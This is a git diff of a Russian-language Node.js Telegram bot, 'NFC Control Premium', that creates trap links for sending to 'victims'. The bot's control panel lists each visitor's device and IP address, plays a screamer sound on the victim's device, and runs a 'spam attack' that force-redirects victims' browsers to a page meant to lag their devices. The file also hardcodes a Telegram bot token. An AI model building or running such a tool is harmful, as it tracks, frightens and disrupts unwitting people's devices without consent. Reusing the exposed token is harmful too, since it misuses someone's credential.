@@ -1,8 +1,3 @@
-/**
- * 🛡️ NFC CONTROL SYSTEM - LITE
- * Упрощенная и чистая версия (RU)
- */
-
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const fs = require('fs');
@@ -17,6 +12,7 @@ ffmpeg.setFfmpegPath(ffmpegPath);
 // --- НАСТРОЙКИ ---
 const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM';
 const DOMAIN = 'https://prank-nfc.onrender.com';
+const SUPPORT_USERNAME = '@your_support'; // Замените на ваш username поддержки
 
 // Проверка глобальных переменных
 if (!global.sessions || !global.activeVictims || !global.shortLinks) {
@@ -35,7 +31,7 @@ const bot = new TelegramBot(token, {
 const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
 const wizardState = {};
 
-console.log('🚀 NFC Bot (Lite) запускается...');
+console.log('🚀 NFC Bot запускается...');
 
 // --- ГЕНЕРАТОР КОДА ---
 function generateShortCode() {
@@ -102,41 +98,321 @@ async function convertStickerToImage(stickerPath) {
 }
 
 // --- ГЛАВНОЕ МЕНЮ ---
+function getMainMenu() {
+    return {
+        inline_keyboard: [
+            [
+                { text: '🎯 Создать ловушку', callback_data: 'create_new' },
+                { text: '📂 Мои сессии', callback_data: 'my_sessions' }
+            ],
+            [
+                { text: '📊 Статистика', callback_data: 'stats' },
+                { text: '📖 Инструкция', callback_data: 'guide' }
+            ],
+            [
+                { text: '💬 Тех. поддержка', url: `https://t.me/${SUPPORT_USERNAME.replace('@', '')}` }
+            ]
+        ]
+    };
+}
+
 bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
+    const userName = msg.from.first_name || 'Пользователь';
     
-    const text = `<b>🤖 NFC Control</b>\n\nПривет! Это пульт управления пранками.\nВыбери действие в меню ниже:`;
+    const welcomeText = `
+🎭 <b>NFC Control Premium</b>
 
-    bot.sendMessage(chatId, text, {
+Привет, ${userName}! 👋
+
+Добро пожаловать в систему управления пранками нового поколения.
+
+<b>Возможности:</b>
+• 🎯 Создание ловушек с кастомным контентом
+• 🔊 Скримеры с любым звуком
+• 🖼 Фоновые изображения и стикеры
+• ☢️ Лаги на устройства
+• 📊 Детальная статистика переходов
+
+Выбери действие в меню ниже 👇`;
+
+    bot.sendMessage(chatId, welcomeText, {
         parse_mode: 'HTML',
-        reply_markup: {
-            keyboard: [
-                ['➕ Новая ловушка'],
-                ['📂 Мои сессии', 'ℹ️ Инфо']
-            ],
-            resize_keyboard: true
-        }
+        reply_markup: getMainMenu()
     });
 });
 
-// --- ИНФО ---
-bot.onText(/ℹ️ Инфо/, (msg) => {
-    const vCount = Object.keys(global.activeVictims || {}).length;
-    const sCount = Object.keys(global.sessions || {}).length;
+// --- ОБРАБОТКА CALLBACK КНОПОК ---
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    const messageId = query.message.message_id;
+    const data = query.data;
 
-    const infoMsg = `
-<b>📊 Статистика:</b>
-• Активных сессий: <b>${sCount}</b>
-• Жертв онлайн: <b>${vCount}</b>
-• Домен: <code>${DOMAIN}</code>
+    // Главное меню
+    if (data === 'main_menu') {
+        const text = `
+🎭 <b>NFC Control Premium</b>
 
-<b>Как создать:</b>
-1. Нажми "Новая ловушка"
-2. Отправь фото/стикер (фон)
-3. Отправь звук/видео (скример)
-4. Получи ссылку
-`;
-    bot.sendMessage(msg.chat.id, infoMsg, { parse_mode: 'HTML' });
+Главное меню системы управления пранками.
+Выбери нужное действие 👇`;
+
+        bot.editMessageText(text, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: getMainMenu()
+        });
+        bot.answerCallbackQuery(query.id);
+        return;
+    }
+
+    // Создать новую ловушку
+    if (data === 'create_new') {
+        wizardState[chatId] = { step: 1, data: {} };
+        
+        const text = `
+<b>🎯 Создание новой ловушки</b>
+
+<b>Шаг 1 из 2: Фоновое изображение</b>
+
+Отправь мне:
+• 🖼 Фото
+• 🎨 Стикер
+• 🎬 Видео (извлечется аудио)
+
+Или напиши <code>skip</code> чтобы пропустить этот шаг.`;
+
+        bot.editMessageText(text, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Отменить', callback_data: 'main_menu' }]
+                ]
+            }
+        });
+        bot.answerCallbackQuery(query.id, { text: '🎯 Начинаем создание...' });
+        return;
+    }
+
+    // Мои сессии
+    if (data === 'my_sessions') {
+        if (!global.sessions) {
+            bot.answerCallbackQuery(query.id, { text: '⚠️ Ошибка данных' });
+            return;
+        }
+        
+        const sessions = Object.values(global.sessions);
+        if (sessions.length === 0) {
+            bot.editMessageText('📂 <b>Мои сессии</b>\n\nУ вас пока нет активных сессий.\nСоздайте первую ловушку! 🎯', {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '🎯 Создать ловушку', callback_data: 'create_new' }],
+                        [{ text: '🔙 Назад', callback_data: 'main_menu' }]
+                    ]
+                }
+            });
+            bot.answerCallbackQuery(query.id);
+            return;
+        }
+
+        const recentSessions = sessions.slice(-5).reverse();
+        
+        bot.deleteMessage(chatId, messageId).catch(() => {});
+        bot.sendMessage(chatId, `📂 <b>Ваши последние ${recentSessions.length} сессий:</b>`, { parse_mode: 'HTML' });
+        
+        for (const s of recentSessions) {
+            await new Promise(resolve => setTimeout(resolve, 300));
+            sendControlPanel(chatId, s.id);
+        }
+        
+        bot.answerCallbackQuery(query.id, { text: '📂 Список сессий' });
+        return;
+    }
+
+    // Статистика
+    if (data === 'stats') {
+        const vCount = Object.keys(global.activeVictims || {}).length;
+        const sCount = Object.keys(global.sessions || {}).length;
+        
+        let totalVictims = 0;
+        Object.values(global.sessions || {}).forEach(s => {
+            totalVictims += s.totalVictims || 0;
+        });
+
+        const statsText = `
+📊 <b>Общая статистика</b>
+
+🎯 <b>Активные сессии:</b> ${sCount}
+👥 <b>Жертв онлайн:</b> ${vCount}
+👁 <b>Всего переходов:</b> ${totalVictims}
+
+🌐 <b>Домен:</b> <code>${DOMAIN}</code>
+
+📅 <b>Обновлено:</b> ${new Date().toLocaleString('ru-RU')}`;
+
+        bot.editMessageText(statsText, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🔄 Обновить', callback_data: 'stats' }],
+                    [{ text: '🔙 Назад', callback_data: 'main_menu' }]
+                ]
+            }
+        });
+        bot.answerCallbackQuery(query.id, { text: '📊 Статистика обновлена' });
+        return;
+    }
+
+    // Инструкция
+    if (data === 'guide') {
+        const guideText = `
+📖 <b>Инструкция по использованию</b>
+
+<b>Как создать ловушку:</b>
+
+1️⃣ Нажми "Создать ловушку"
+2️⃣ Отправь фоновое изображение (или skip)
+3️⃣ Отправь звук для скримера (или skip)
+4️⃣ Получи готовую ссылку
+
+<b>Управление:</b>
+🔊 <b>Скример</b> - воспроизвести звук
+☢️ <b>Запустить лаги</b> - отправит на сайт с лагами
+🔄 <b>Обновить</b> - обновить информацию
+❌ <b>Удалить</b> - удалить сессию
+
+<b>Форматы файлов:</b>
+• Изображения: JPG, PNG
+• Стикеры: WEBP (автоконвертация)
+• Звук: MP3, OGG, M4A, голосовые
+• Видео: MP4, MOV (извлечётся аудио)
+
+<b>💡 Совет:</b> Используйте короткие звуки (до 10 сек) для лучшего эффекта скримера.`;
+
+        bot.editMessageText(guideText, {
+            chat_id: chatId,
+            message_id: messageId,
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🔙 Назад', callback_data: 'main_menu' }]
+                ]
+            }
+        });
+        bot.answerCallbackQuery(query.id, { text: '📖 Инструкция' });
+        return;
+    }
+
+    // Управление сессиями
+    if (data.includes('_')) {
+        const [action, sessionId] = data.split('_');
+        const s = global.sessions ? global.sessions[sessionId] : null;
+
+        if (!s && action !== 'del') {
+            bot.answerCallbackQuery(query.id, { text: '⚠️ Сессия не найдена' });
+            return;
+        }
+        
+        if (!global.io) {
+            bot.answerCallbackQuery(query.id, { text: '⚠️ Ошибка сервера' });
+            return;
+        }
+
+        switch (action) {
+            case 'scare':
+                global.io.to(sessionId).emit('play-sound');
+                bot.answerCallbackQuery(query.id, { text: '🔊 Скример активирован!', show_alert: true });
+                break;
+
+            case 'bomb':
+                global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
+                bot.answerCallbackQuery(query.id, { text: '☢️ Спам-атака запущена!', show_alert: true });
+                break;
+
+            case 'refresh':
+                bot.deleteMessage(chatId, messageId).catch(() => {});
+                sendControlPanel(chatId, sessionId);
+                bot.answerCallbackQuery(query.id, { text: '🔄 Обновлено' });
+                break;
+
+            case 'del':
+                const confirmText = `
+⚠️ <b>Подтверждение удаления</b>
+
+Вы уверены, что хотите удалить эту сессию?
+
+Код: <code>${s.shortCode}</code>
+Переходов: ${s.totalVictims}
+
+<b>Это действие необратимо!</b>`;
+
+                bot.editMessageText(confirmText, {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Да, удалить', callback_data: `confirm_del_${sessionId}` },
+                                { text: '❌ Отмена', callback_data: `refresh_${sessionId}` }
+                            ]
+                        ]
+                    }
+                });
+                bot.answerCallbackQuery(query.id);
+                break;
+
+            case 'confirm_del':
+                if (global.sessions[sessionId]) delete global.sessions[sessionId];
+                if (s && global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
+                
+                bot.deleteMessage(chatId, messageId).catch(() => {});
+                bot.sendMessage(chatId, '✅ Сессия успешно удалена', {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
+                        ]
+                    }
+                });
+                bot.answerCallbackQuery(query.id, { text: '✅ Удалено' });
+                break;
+
+            case 'info':
+                const infoText = `
+ℹ️ <b>Информация о сессии</b>
+
+🆔 <b>ID:</b> <code>${s.id}</code>
+🔗 <b>Короткий код:</b> <code>${s.shortCode}</code>
+📅 <b>Создана:</b> ${s.createdAt.toLocaleString('ru-RU')}
+
+<b>Настройки:</b>
+• Фон: ${s.image ? '✅ Установлен' : '❌ Не установлен'}
+• Звук: ${s.sound ? '✅ Установлен' : '❌ Не установлен'}
+
+<b>Статистика:</b>
+• Всего переходов: ${s.totalVictims}
+• Последняя активность: ${new Date(s.lastActiveAt).toLocaleString('ru-RU')}`;
+
+                bot.answerCallbackQuery(query.id, { text: 'ℹ️ Подробная информация', show_alert: false });
+                
+                bot.sendMessage(chatId, infoText, {
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '🔙 К панели', callback_data: `refresh_${sessionId}` }]
+                        ]
+                    }
+                });
+                break;
+        }
+    }
 });
 
 // --- ОБРАБОТКА СООБЩЕНИЙ ---
@@ -144,31 +420,8 @@ bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
 
+    // Игнорируем команды
     if (text && text.startsWith('/')) return;
-
-    // СОЗДАНИЕ
-    if (text === '➕ Новая ловушка') {
-        wizardState[chatId] = { step: 1, data: {} };
-        bot.sendMessage(chatId, '<b>Шаг 1/2: Фон</b>\nОтправь фото, стикер, видео или напиши <code>skip</code>.', { parse_mode: 'HTML' });
-        return;
-    }
-
-    // СПИСОК СЕССИЙ
-    if (text === '📂 Мои сессии') {
-        if (!global.sessions) return bot.sendMessage(chatId, 'Ошибка данных.');
-        
-        const sessions = Object.values(global.sessions);
-        if (sessions.length === 0) return bot.sendMessage(chatId, 'Список пуст.');
-
-        const recentSessions = sessions.slice(-5);
-        bot.sendMessage(chatId, `Последние ${recentSessions.length} сессий:`);
-        
-        for (const s of recentSessions) {
-            await new Promise(resolve => setTimeout(resolve, 200));
-            sendControlPanel(chatId, s.id);
-        }
-        return;
-    }
 
     // --- WIZARD ---
     if (wizardState[chatId]) {
@@ -176,7 +429,7 @@ bot.on('message', async (msg) => {
 
         // ШАГ 1: ФОН
         if (st.step === 1) {
-            let loadingMsg = await bot.sendMessage(chatId, '⏳ Обработка...');
+            const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Обработка файла...</b>', { parse_mode: 'HTML' });
             
             try {
                 if (msg.photo) {
@@ -207,42 +460,89 @@ bot.on('message', async (msg) => {
                 }
                 else {
                     bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
-                    return bot.sendMessage(chatId, '⚠️ Отправь файл или напиши skip.');
+                    bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь фото, стикер, видео или напиши <code>skip</code>', { 
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: '❌ Отменить', callback_data: 'main_menu' }]
+                            ]
+                        }
+                    });
+                    return;
                 }
             } catch (e) {
                 console.error(e);
+                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                bot.sendMessage(chatId, '❌ Ошибка обработки файла. Попробуй снова.', {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '❌ Отменить', callback_data: 'main_menu' }]
+                        ]
+                    }
+                });
+                return;
             }
 
             bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
             
             st.step = 2;
-            const soundText = st.data.sound ? '✅ Звук уже есть (из видео).\nНапиши <code>skip</code> чтобы продолжить.' : '<b>Шаг 2/2: Звук</b>\nОтправь аудио/голос или <code>skip</code>.';
-            bot.sendMessage(chatId, soundText, { parse_mode: 'HTML' });
+            
+            const soundText = st.data.sound 
+                ? '✅ <b>Звук уже извлечён из видео!</b>\n\nМожешь отправить другой звук или напиши <code>skip</code> для завершения.' 
+                : '<b>Шаг 2 из 2: Звук для скримера</b>\n\nОтправь мне:\n• 🔊 Аудиофайл\n• 🎤 Голосовое сообщение\n• 🎬 Видео\n\nИли напиши <code>skip</code> чтобы пропустить.';
+            
+            bot.sendMessage(chatId, soundText, { 
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '❌ Отменить', callback_data: 'main_menu' }]
+                    ]
+                }
+            });
             return;
         }
 
         // ШАГ 2: ЗВУК
         if (st.step === 2) {
             if (!st.data.sound || (msg.audio || msg.voice || msg.video)) {
-                 let loadingMsg = await bot.sendMessage(chatId, '⏳ Загрузка звука...');
+                const loadingMsg = await bot.sendMessage(chatId, '⏳ <b>Загрузка звука...</b>', { parse_mode: 'HTML' });
                  
-                 if (msg.audio) {
-                    const f = await downloadFile(msg.audio.file_id, 'snd');
-                    st.data.sound = f.url || '';
-                 }
-                 else if (msg.voice) {
-                    const f = await downloadFile(msg.voice.file_id, 'voice');
-                    st.data.sound = f.url || '';
-                 }
-                 else if (msg.video) {
-                    const f = await downloadFile(msg.video.file_id, 'video');
-                    if (f.path) {
-                        const audioData = await extractAudioFromVideo(f.path);
-                        st.data.sound = audioData.url || '';
+                try {
+                    if (msg.audio) {
+                        const f = await downloadFile(msg.audio.file_id, 'snd');
+                        st.data.sound = f.url || '';
                     }
-                 }
+                    else if (msg.voice) {
+                        const f = await downloadFile(msg.voice.file_id, 'voice');
+                        st.data.sound = f.url || '';
+                    }
+                    else if (msg.video) {
+                        const f = await downloadFile(msg.video.file_id, 'video');
+                        if (f.path) {
+                            const audioData = await extractAudioFromVideo(f.path);
+                            st.data.sound = audioData.url || '';
+                        }
+                    }
+                    else if (text && text.toLowerCase() === 'skip') {
+                        // Пропускаем
+                    }
+                    else {
+                        bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                        bot.sendMessage(chatId, '⚠️ <b>Неверный формат</b>\n\nОтправь аудио, голосовое или напиши <code>skip</code>', {
+                            parse_mode: 'HTML',
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [{ text: '❌ Отменить', callback_data: 'main_menu' }]
+                                ]
+                            }
+                        });
+                        return;
+                    }
+                } catch (e) {
+                    console.error(e);
+                }
                  
-                 bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
+                bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
             }
 
             finishSessionCreation(chatId, st.data);
@@ -272,107 +572,96 @@ function finishSessionCreation(chatId, data) {
     global.sessions[id] = session;
     global.shortLinks[code] = id;
 
-    bot.sendMessage(chatId, '✅ Ловушка готова!');
-    setTimeout(() => sendControlPanel(chatId, id), 300);
+    const successText = `
+✅ <b>Ловушка успешно создана!</b>
+
+🔗 <b>Ваша ссылка:</b>
+<code>${DOMAIN}/${code}</code>
+
+🆔 <b>Короткий код:</b> <code>${code}</code>
+
+<b>Настройки:</b>
+• Фон: ${data.image ? '✅' : '❌'}
+• Звук: ${data.sound ? '✅' : '❌'}
+
+Отправь ссылку жертве и управляй через панель! 🎮`;
+
+    bot.sendMessage(chatId, successText, { parse_mode: 'HTML' });
+    
+    setTimeout(() => sendControlPanel(chatId, id), 500);
 }
 
 // --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
 function sendControlPanel(chatId, sessionId) {
     const s = global.sessions[sessionId];
-    if (!s) return bot.sendMessage(chatId, 'Сессия не найдена.');
+    if (!s) {
+        bot.sendMessage(chatId, '⚠️ Сессия не найдена.', {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🔙 В главное меню', callback_data: 'main_menu' }]
+                ]
+            }
+        });
+        return;
+    }
 
     const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
     const link = `${DOMAIN}/${s.shortCode}`;
     
-    // Простой визуал статуса
-    let statusText = `<b>🎮 Панель управления</b>\n\n` +
-                     `🔗 <b>Ссылка:</b> <code>${link}</code>\n` +
-                     `🆔 <b>Код:</b> <code>${s.shortCode}</code>\n\n` +
-                     `⚙️ <b>Статус:</b>\n` +
-                     `• Фон: ${s.image ? '✅' : '❌'}\n` +
-                     `• Звук: ${s.sound ? '✅' : '❌'}\n` +
-                     `• Авто-атака: ${s.autoMode ? 'Включена 🟢' : 'Выключена 🔴'}\n\n` +
-                     `👥 <b>Жертв онлайн:</b> ${victims.length}\n` +
-                     `👁 <b>Всего переходов:</b> ${s.totalVictims}`;
+    // Эмодзи статусов
+    const bgStatus = s.image ? '🟢' : '🔴';
+    const soundStatus = s.sound ? '🟢' : '🔴';
+    
+    let statusText = `
+🎮 <b>Панель управления</b>
+
+🔗 <b>Ссылка:</b> <code>${link}</code>
+🆔 <b>Код:</b> <code>${s.shortCode}</code>
+
+⚙️ <b>Настройки:</b>
+${bgStatus} Фон: ${s.image ? 'Установлен' : 'Отсутствует'}
+${soundStatus} Звук: ${s.sound ? 'Установлен' : 'Отсутствует'}
+
+📊 <b>Статистика:</b>
+👥 Онлайн: <b>${victims.length}</b>
+👁 Переходов: <b>${s.totalVictims}</b>`;
 
     if (victims.length > 0) {
-        statusText += `\n\n📱 <b>Устройства:</b>\n`;
+        statusText += `\n\n📱 <b>Подключенные устройства:</b>`;
         victims.forEach((v, i) => {
-            statusText += `${i + 1}. ${v.device} (IP: ${v.ip})\n`;
+            statusText += `\n${i + 1}. ${v.device} • ${v.ip}`;
         });
     }
 
+    const keyboard = [
+        [
+            { text: '🔊 Скример', callback_data: `scare_${sessionId}` },
+            { text: '☢️ Спам-атака', callback_data: `bomb_${sessionId}` }
+        ],
+        [
+            { text: '🔄 Обновить', callback_data: `refresh_${sessionId}` },
+            { text: 'ℹ️ Подробнее', callback_data: `info_${sessionId}` }
+        ],
+        [
+            { text: '❌ Удалить сессию', callback_data: `del_${sessionId}` }
+        ]
+    ];
+
     bot.sendMessage(chatId, statusText, {
         parse_mode: 'HTML',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🔊 Скример', callback_data: `scare_${sessionId}` },
-                    { text: '☢️ Спам', callback_data: `bomb_${sessionId}` }
-                ],
-                [
-                    { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`, callback_data: `auto_${sessionId}` },
-                    { text: '🔄 Обновить', callback_data: `refresh_${sessionId}` }
-                ],
-                [
-                    { text: '❌ Удалить', callback_data: `del_${sessionId}` }
-                ]
-            ]
-        }
-    }).catch(err => console.error(err.message));
+        reply_markup: { inline_keyboard: keyboard }
+    }).catch(err => console.error('Ошибка отправки панели:', err.message));
 }
 
-// --- CALLBACKS ---
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-    const data = query.data;
-    
-    if (!data || !data.includes('_')) return;
-    
-    const [action, sessionId] = data.split('_');
-    const s = global.sessions ? global.sessions[sessionId] : null;
-
-    if (!s && action !== 'del') return bot.answerCallbackQuery(query.id, { text: 'Сессия не существует' });
-    if (!global.io) return bot.answerCallbackQuery(query.id, { text: 'Ошибка сервера' });
-
-    switch (action) {
-        case 'scare':
-            global.io.to(sessionId).emit('play-sound');
-            bot.answerCallbackQuery(query.id, { text: '🔊 Бу!!' });
-            break;
-
-        case 'bomb':
-            global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
-            bot.answerCallbackQuery(query.id, { text: '☢️ Спам запущен!' });
-            break;
-
-        case 'auto':
-            s.autoMode = !s.autoMode;
-            global.io.to(sessionId).emit('update-media', { sound: s.sound, image: s.image, auto: s.autoMode });
-            
-            // Обновляем кнопку
-            const kb = query.message.reply_markup.inline_keyboard;
-            kb[1][0].text = `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`;
-            try {
-                bot.editMessageReplyMarkup({ inline_keyboard: kb }, { chat_id: chatId, message_id: query.message.message_id });
-            } catch (e) {}
-            
-            bot.answerCallbackQuery(query.id, { text: `Авто-режим: ${s.autoMode ? 'ON' : 'OFF'}` });
-            break;
-
-        case 'refresh':
-            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-            sendControlPanel(chatId, sessionId);
-            bot.answerCallbackQuery(query.id, { text: 'Обновлено' });
-            break;
-
-        case 'del':
-            if (global.sessions[sessionId]) delete global.sessions[sessionId];
-            if (s && global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
-            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
-            bot.answerCallbackQuery(query.id, { text: 'Удалено' });
-            break;
-    }
+// --- ОБРАБОТКА ОШИБОК ---
+bot.on('polling_error', (error) => {
+    console.error('Polling error:', error.message);
 });
+
+bot.on('error', (error) => {
+    console.error('Bot error:', error.message);
+});
+
+console.log('✅ NFC Bot готов к работе!');
 
 module.exports = bot;
